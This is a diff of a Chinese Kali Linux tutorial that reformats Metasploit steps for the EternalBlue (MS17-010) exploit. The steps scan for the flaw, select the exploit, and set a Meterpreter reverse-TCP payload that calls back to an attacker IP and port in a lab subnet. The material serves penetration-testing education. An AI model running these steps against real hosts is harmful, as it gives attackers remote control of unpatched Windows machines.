@@ -28,10 +28,10 @@ search smb_ms17_010
 
   使用此模块，并设置被攻击主机IP
 
-```
-use auxiliary``/scanner/smb/smb_ms17_010``show options
-设置被攻击的主机IP
-set` `RHOSTS 192.168.205.200
+```shell
+use auxiliary /scanner/smb/smb_ms17_010 show options
+# 设置被攻击的主机IP
+set RHOSTS 192.168.205.200
 ```
 
 ![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/4.png)
@@ -46,16 +46,24 @@ run
 
 ## 5. 使用攻击模块设置被攻击主机IP
 
-```
-use exploit``/windows/smb/ms17_010_eternalblue``set` `rhosts 192.168.205.200
+```shell
+use exploit /windows/smb/ms17_010_eternalblue 
+set rhosts 192.168.205.200
 ```
 
 ![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/6.png)
 
 ## 6. 设置攻击载荷（kali所在主机IP及监听端口
 
-```
-# 攻击载荷``set` `payload windows``/x64/meterpreter/reverse_tcp``# 攻击机IP（kali主机）``set` `lhost 192.168.205.173``# 攻击机监听端口``set` `lport 6666``# 查看设置的参数``show options
+```shell
+# 攻击载荷
+set payload windows /x64/meterpreter/reverse_tcp
+# 攻击机IP（kali主机）
+set` `lhost 192.168.205.173
+# 攻击机监听端口
+set lport 6666 
+# 查看设置的参数
+show options
 ```
 
 ![img](https://longlizl.github.io/kali相关/永恒之蓝漏洞/images/7.png)
